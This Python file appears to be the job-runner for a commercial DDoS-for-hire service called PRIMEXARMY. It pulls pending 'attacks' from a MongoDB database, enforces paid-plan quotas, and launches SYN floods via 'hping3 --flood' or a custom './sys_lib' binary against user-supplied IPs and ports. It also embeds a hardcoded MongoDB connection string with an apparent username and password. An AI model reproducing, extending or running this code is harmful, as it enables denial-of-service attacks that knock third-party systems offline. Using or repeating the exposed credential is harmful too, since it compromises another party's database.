# system_update.py - NEW VERSION with Full Integration
import os
import time
import pymongo
import subprocess
import threading
import signal
import sys
from datetime import datetime
from typing import List, Dict

class AttackMonitor:
    """
    Advanced Attack Monitor with:
    - Multi-threaded attack execution
    - Auto cleanup of processes
    - Attack logging
    - Rate limiting
    - Error handling
    """
    
    def __init__(self, mongo_url: str):
        self.mongo_url = mongo_url
        self.client = None
        self.db = None
        self.attacks_col = None
        self.users_col = None
        self.active_processes: List[subprocess.Popen] = []
        self.running = True
        self.stats = {
            "total_attacks": 0,
            "active_attacks": 0,
            "completed_attacks": 0,
            "failed_attacks": 0
        }
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Connect to MongoDB
        self._connect_mongodb()
    
    def _signal_handler(self, sig, frame):
        """Handle shutdown signals"""
        print("\n🛑 Stopping Attack Monitor...")
        self.running = False
        self._cleanup_all_processes()
        sys.exit(0)
    
    def _connect_mongodb(self):
        """Connect to MongoDB with retry"""
        retry_count = 0
        while retry_count < 5:
            try:
                self.client = pymongo.MongoClient(
                    self.mongo_url,
                    serverSelectionTimeoutMS=5000,
                    connectTimeoutMS=5000
                )
                self.client.admin.command('ping')
                self.db = self.client['v43_db']
                self.attacks_col = self.db['attacks']
                self.users_col = self.db['users']
                
                # Create indexes
                self.attacks_col.create_index("status")
                self.attacks_col.create_index("created_at")
                self.attacks_col.create_index("uid")
                
                print("✅ MongoDB connected successfully")
                return
            except Exception as e:
                retry_count += 1
                print(f"⚠️ MongoDB connection failed (attempt {retry_count}/5): {e}")
                time.sleep(5)
        
        print("❌ Failed to connect to MongoDB")
        sys.exit(1)
    
    def _cleanup_all_processes(self):
        """Clean up all running attack processes"""
        print(f"🧹 Cleaning up {len(self.active_processes)} active processes...")
        for process in self.active_processes:
            try:
                process.terminate()
                process.wait(timeout=2)
            except:
                try:
                    process.kill()
                except:
                    pass
        self.active_processes.clear()
    
    def _clean_finished_processes(self):
        """Remove finished processes from list"""
        self.active_processes = [p for p in self.active_processes if p.poll() is None]
    
    def _execute_attack(self, attack: Dict):
        """Execute a single attack"""
        try:
            attack_id = attack['_id']
            ip = attack.get('ip', attack.get('target', ''))
            port = attack['port']
            duration = attack['time'] if 'time' in attack else attack.get('duration', 60)
            method = attack.get('method', 'UDP')
            uid = attack['uid']
            
            print(f"🔥 [{datetime.now().strftime('%H:%M:%S')}] Attack: {method} {ip}:{port} for {duration}s")
            
            # Update status to running
            self.attacks_col.update_one(
                {"_id": attack_id},
                {
                    "$set": {
                        "status": "running",
                        "started_at": time.time(),
                        "method": method
                    }
                }
            )
            
            # Choose attack method
            process = None
            
            # Method 1: Using hping3 (if available)
            if method.upper() in ["SYN", "TCP", "UDP"]:
                cmd = f"timeout {duration} hping3 -S -p {port} --flood {ip} 2>/dev/null"
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            # Method 2: Using ./sys_lib (custom binary)
            elif os.path.exists("./sys_lib"):
                process = subprocess.Popen(
                    ["./sys_lib", str(ip), str(port), str(duration), "50"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            # Method 3: Simple sleep (for testing)
            else:
                cmd = f"sleep {duration}"
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            if process:
                self.active_processes.append(process)
                self.stats["active_attacks"] += 1
                
                # Schedule completion handler
                def mark_complete(attack_id, proc, ip, port):
                    try:
                        proc.wait()
                        # Check if completed successfully
                        if proc.returncode == 0 or proc.returncode is None:
                            status = "completed"
                        else:
                            status = "failed"
                        
                        self.attacks_col.update_one(
                            {"_id": attack_id},
                            {
                                "$set": {
                                    "status": status,
                                    "completed_at": time.time(),
                                    "exit_code": proc.returncode
                                }
                            }
                        )
                        
                        if status == "completed":
                            self.stats["completed_attacks"] += 1
                            print(f"✅ Attack completed: {ip}:{port}")
                        else:
                            self.stats["failed_attacks"] += 1
                            print(f"❌ Attack failed: {ip}:{port}")
                            
                    except Exception as e:
                        print(f"⚠️ Completion handler error: {e}")
                        self.attacks_col.update_one(
                            {"_id": attack_id},
                            {"$set": {"status": "failed", "error": str(e)}}
                        )
                    finally:
                        self.stats["active_attacks"] -= 1
                        self._clean_finished_processes()
                
                # Start completion thread
                threading.Thread(
                    target=mark_complete,
                    args=(attack_id, process, ip, port),
                    daemon=True
                ).start()
                
                self.stats["total_attacks"] += 1
                
        except Exception as e:
            print(f"❌ Attack execution error: {e}")
            self.attacks_col.update_one(
                {"_id": attack_id},
                {"$set": {"status": "failed", "error": str(e)}}
            )
    
    def _check_user_limits(self, uid: int) -> bool:
        """Check if user has reached their limits"""
        try:
            user = self.users_col.find_one({"uid": uid})
            if not user:
                return False
            
            # Check if user plan is active
            expiry = user.get('expiry', 0)
            if expiry > 0 and expiry < time.time():
                return False
            
            # Check daily limit
            today = datetime.now().strftime('%Y-%m-%d')
            today_attacks = self.attacks_col.count_documents({
                "uid": uid,
                "date": today,
                "status": {"$in": ["running", "completed"]}
            })
            
            plan = user.get('plan', 'free')
            limits = {
                "free": 10,
                "basic": 50,
                "premium": 200,
                "vip": 1000
            }
            daily_limit = limits.get(plan, 10)
            
            return today_attacks < daily_limit
            
        except Exception as e:
            print(f"⚠️ User limit check error: {e}")
            return True  # Allow if check fails
    
    def run(self):
        """Main monitor loop"""
        print("🚀 PRIMEXARMY Attack Monitor Started")
        print(f"📊 MongoDB: {self.mongo_url[:50]}...")
        print("⚡ Ready to process attacks\n")
        
        while self.running:
            try:
                # Clean finished processes
                self._clean_finished_processes()
                
                # Get pending attacks (with limits)
                pending_attacks = list(self.attacks_col.find({
                    "status": "pending"
                }).limit(10))
                
                for attack in pending_attacks:
                    # Check user limits
                    if not self._check_user_limits(attack['uid']):
                        # Mark as failed due to limit
                        self.attacks_col.update_one(
                            {"_id": attack["_id"]},
                            {
                                "$set": {
                                    "status": "failed",
                                    "error": "Daily limit reached"
                                }
                            }
                        )
                        continue
                    
                    # Execute attack
                    self._execute_attack(attack)
                    
                    # Small delay between attacks
                    time.sleep(0.5)
                
                # Display stats every 30 seconds
                if int(time.time()) % 30 == 0:
                    print(f"📊 Stats - Active: {self.stats['active_attacks']}, "
                          f"Total: {self.stats['total_attacks']}, "
                          f"Completed: {self.stats['completed_attacks']}")
                
                time.sleep(2)
                
            except Exception as e:
                print(f"❌ Monitor loop error: {e}")
                time.sleep(5)
        
        print("🛑 Attack Monitor Stopped")
    
    def get_status(self) -> Dict:
        """Get monitor status"""
        return {
            "running": self.running,
            "active_attacks": self.stats["active_attacks"],
            "total_attacks": self.stats["total_attacks"],
            "completed_attacks": self.stats["completed_attacks"],
            "failed_attacks": self.stats["failed_attacks"],
            "process_count": len(self.active_processes)
        }

def main():
    """Main entry point"""
    MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://pramil:cSnJK0jIZ9FSfIAF@cluster0.ycf4z0g.mongodb.net/?retryWrites=true&w=majority")
    
    monitor = AttackMonitor(MONGO_URL)
    
    try:
        monitor.run()
    except KeyboardInterrupt:
        print("\n🛑 Shutdown requested")
        monitor.running = False
        monitor._cleanup_all_processes()

if __name__ == "__main__":
    main()
